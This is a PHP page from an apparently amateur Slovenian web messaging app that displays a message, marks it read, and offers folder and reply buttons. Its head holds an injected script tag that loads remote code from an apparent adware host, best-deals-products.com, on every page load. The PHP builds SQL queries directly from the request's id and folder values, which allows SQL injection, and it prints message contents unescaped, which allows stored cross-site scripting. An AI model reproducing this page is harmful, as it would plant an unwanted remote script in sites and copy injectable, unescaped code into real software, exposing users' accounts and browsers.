<html lang="en">
  <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Sporočilo</title>

    <!-- Bootstrap core CSS -->
    <link href="bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron-narrow.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>

  <body>
    <div class="container">
      <div class="header clearfix">
        <h3 class="text-muted">Sporočilo</h3>
      </div>
      <div class="jumbotron" >
	<?php
			session_start();
			include "povezava.php";
			if(isset($_SESSION['id']))
			{
				$id = $_GET['id'];
	            $sqlsender = "select u.ime, u.priimek, t.cas, u.id_uporabnika from uporabnik u inner join transakcija t on u.id_uporabnika=t.sender where t.id_transakcije='$id'";
				$sqlreciever = "select u.ime, u.priimek, t.cas from uporabnik u inner join transakcija t on u.id_uporabnika=t.reciever where t.id_transakcije='$id';";
				$sqlvsebina = "select t.zadeva, t.vsebina, t.cas from transakcija t where t.id_transakcije='$id'";
				$sqlpredal = "select UPPER(p.naziv) from predal p inner join transakcija t on t.id_predala=p.id_predala where t.id_transakcije='$id'";
				$rezpredal = mysqli_query($con, $sqlpredal);
				$senderrez = mysqli_query($con, $sqlsender);
				$recieverrez = mysqli_query($con, $sqlreciever);
				$vsebinarez = mysqli_query($con, $sqlvsebina);
				while($vsebina = mysqli_fetch_row($vsebinarez)){
					$sender = mysqli_fetch_row($senderrez);
					$reciever = mysqli_fetch_row($recieverrez);
					$predal = mysqli_fetch_row($rezpredal);
					echo 'Sporocilo je v predalu <h4>' . $predal[0] . '</h4><br>';
					echo 'Posiljatelj: ' . $sender[0] . ' ' . $sender[1] . '<br>';
					echo 'Prejemnik: ' . $reciever[0] . ' ' . $reciever[1] . '<br>';
					echo 'Zadeva: <strong>' . $vsebina[0] . '</strong><br>';
					echo $vsebina[1];
					$odgovor=$sender[3];
					$odgovorime=$sender[0];
					$odgovorpriimek=$sender[1];
				}
				$sqlquery="update transakcija set prebrano = 1 where ID_transakcije = '$id'";
				mysqli_query($con,$sqlquery);				
			}
			else
			{
				header("location:index.php");
			}
			if(isset($_POST['nazaj']))
			{
				header("location:profil.php?predal=0");	
			}

		?>
		</div>
</div>
	<form method="POST"><div style="width:30%; margin-right:auto; margin-left:auto;">
	<select name="predal">
		<option>Izberi predal...</option>
		<?php
			$id_upo = $_SESSION['id'];
			$sqlpredal = "select id_predala, naziv from predal where id_lastnika='$id_upo'";
			$rezpredal = mysqli_query($con, $sqlpredal);
			while($predal = mysqli_fetch_row($rezpredal)){
				echo '<option value="' . $predal[0] . '">' . $predal[1] . '</option>'; 
			}
		?>
	</select>
	<button class="btn btn-default" name="btnpredal">Dodaj v predal</button><br><br>
	<button class="btn btn-lg btn-success btn-block" name="reply">Odgovori</button>
	<button class="btn btn-lg btn-primary btn-block" name="nazaj" type="submit">Nazaj</button>
</div>
	<?php
	if(isset($_POST['reply']))
		{
			$_SESSION['odgovor']['odgovorid']=$odgovor;
			$_SESSION['odgovor']['odgovorime']=$odgovorime;
			$_SESSION['odgovor']['odgovorpriimek']=$odgovorpriimek;
			header("location:reply.php");
		}
	if(isset($_POST['btnpredal'])){
		$id_pre = $_POST['predal'];
		$sqldodaj = "update transakcija set id_predala='$id_pre' where id_transakcije='$id'";
		mysqli_query($con, $sqldodaj);
		header('Location: profil.php?predal=0');
	}
	?>
	</form>

	</body>
</html>
